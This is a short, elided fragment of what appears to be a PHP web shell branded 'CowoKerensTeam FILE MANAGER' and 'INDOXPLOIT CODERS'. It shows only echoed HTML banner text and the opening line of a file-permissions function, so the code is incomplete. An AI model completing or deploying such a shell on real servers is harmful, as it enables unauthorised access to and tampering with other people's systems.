...
<html>
<head>
<title>CowoKerenteam-Galerz</title>
</head>';
...
echo '</head>
<body><b>
<H1><center> &lt;/&gt; <font color="red">CowoKerensTeam</font> <font color="dodgerblue">FILE MANAGER</font></center></h1>
...
echo '<br><center>{ INDOXPLOIT CODERS }<br>[SKILL 1%] [BACOT 98%] [COLI 1%]<br>&lt;/&gt; ZONE_BLACK_HOLE</b></body>
</html>';
function perms($file){
